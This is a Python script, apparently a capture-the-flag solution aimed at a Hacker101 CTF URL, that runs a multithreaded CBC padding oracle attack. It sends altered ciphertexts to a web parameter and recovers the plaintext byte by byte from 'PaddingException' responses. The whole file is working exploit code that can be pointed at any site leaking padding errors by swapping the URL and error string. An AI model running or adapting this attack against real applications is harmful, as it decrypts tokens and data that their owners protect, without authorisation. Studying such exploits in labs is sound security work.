#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys, re, requests, threading
from base64 import b64encode
from itertools import cycle
from time import sleep
from math import ceil

maxthreads = 10

def test_validity(response, error):
    data = response.text
    if data.find(error) == -1:
        return 1
    return 0


def call_oracle(conn, url, up_cipher):
    b64 = b64encode(bytes.fromhex(up_cipher)).decode()
    b64 = b64.replace('=', '~').replace('/', '!').replace('+', '-')

    while True:
        try:
            response = conn.get(url + b64)
            the_page = response.text
            code = response.status_code
            if code != 200:
                print('\n[-] Return code %s' % code)
                continue

        except KeyboardInterrupt:
            print('\nAborted')
            sys.exit()
        except:
            print('\n[-] Request Error! ')
            try:
                sleep(1)
            except KeyboardInterrupt:
                print('\nAborted')
                sys.exit()
            continue
        break

    return response


def split_len(seq, length):
    return [seq[i : i + length] for i in range(0, len(seq), length)]

def block_search_byte(size_block, i, pos, l):
    hex_char = hex(pos).split("0x")[1]
    return (
        "00" * (size_block - (i + 1))
        + ("0" if len(hex_char) % 2 != 0 else "")
        + hex_char
        + "".join(l)
    )

def block_padding(size_block, i):
    l = []
    for t in range(0, i + 1):
        l.append(
            ("0" if len(hex(i + 1).split("0x")[1]) % 2 != 0 else "")
            + (hex(i + 1).split("0x")[1])
        )
    return "00" * (size_block - (i + 1)) + "".join(l)


def hex_xor(s1, s2):
    b = bytearray()
    for c1, c2 in zip(bytes.fromhex(s1), cycle(bytes.fromhex(s2))):
        b.append(c1 ^ c2)
    return b.hex()


def worker(n, i, url):
    global error, bytes_found, found, valide_value, size_block, cipher_block, block, result

    conn = requests.Session()

    m = ceil(256/maxthreads)
    init = n*m
    end = min(256,(n+1)*m)

    for ct_pos in range(init, end):

        if found != False:
            conn.close()
            return

        # 1 xor 1 = 0 or valide padding need to be checked
        if ct_pos != i + 1 or (
            len(valide_value) > 0 and int(valide_value[-1], 16) == ct_pos
        ):

            bk = block_search_byte(size_block, i, ct_pos, valide_value)
            bp = cipher_block[block - 1]
            bc = block_padding(size_block, i)

            tmp = hex_xor(bk, bp)
            cb = hex_xor(tmp, bc).upper()

            up_cipher = cb + cipher_block[block]

            response = call_oracle(conn, url, up_cipher)

            if n==0:
                exe = re.findall("..", cb)
                discover = ("").join(exe[size_block - i : size_block])
                current = ("").join(exe[size_block - i - 1 : size_block - i])
                find_me = ("").join(exe[: -i - 1])
                sys.stdout.write(
                    "\033[2K\r[+] Test [Byte %03i/%03i]: \033[31m%s\033[33m%s\033[36m%s\033[0m"
                    % (ct_pos, end, find_me, current, discover)
                )
                sys.stdout.flush()

            if test_validity(response, error):
                found = bk
                conn.close()
                return


def run(url, cipher):
    global error, bytes_found, found, valide_value, size_block, cipher_block, block, result

    size_block = 16
    error = 'PaddingException'

    cipher = cipher.upper()
    found = False
    valide_value = []
    result = []
    len_block = size_block * 2
    cipher_block = split_len(cipher, len_block)

    print(cipher)

    if len(cipher_block) == 1:
        print("[-] Abort there is only one block")
        sys.exit()
    # for each cipher_block
    for block in reversed(range(1, len(cipher_block))):
        if len(cipher_block[block]) != len_block:
            print("[-] Abort length block doesn't match the size_block")
            break
        print("[+] Search value block : ", block, "\n")
        # for each byte of the block
        for i in range(0, size_block):

            threads = []
            for n in range(0, maxthreads):
                tr = threading.Thread(target=worker, args=(n,i,url, ))
                threads.append(tr)
                tr.start()

            for m in threads:
                m.join()

            if found:
                # data analyse and insert in right order
                value = re.findall("..", found)
                valide_value.insert(0, value[size_block - (i + 1)])

                bytes_found = "".join(valide_value)

                print(
                    "\033[2K\r\033[36m" + "\033[1m" + "[+]" + "\033[0m" + " Found",
                    i + 1,
                    "bytes :",
                    bytes_found,
                    "\n"
                )
            else:
                print("\n[-] Error decryption failed")
                result.insert(0, "".join(valide_value))
                hex_r = "".join(result)
                print("[+] Partial Decrypted value (HEX):", hex_r.upper())
                padding = int(hex_r[len(hex_r) - 2 : len(hex_r)], 16)
                print(
                    "[+] Partial Decrypted value (ASCII):",
                    bytes.fromhex(hex_r[0 : -(padding * 2)]).decode(),
                )
                sys.exit()

            found = False

        result.insert(0, "".join(valide_value))
        valide_value = []

    return "".join(result)

    hex_r = "".join(result)
    print("\n[+] Decrypted value (HEX):", hex_r.upper())
    padding = int(hex_r[len(hex_r) - 2 : len(hex_r)], 16)
    print(
        "[+] Decrypted value (ASCII):",
        bytes.fromhex(hex_r[0 : -(padding * 2)]).decode(),
    )


if __name__ == "__main__":
    url = 'https://5e0dbed32e3e0b25900f17949e212b9a.ctf.hacker101.com/?post='
    run(url, sys.argv[1])
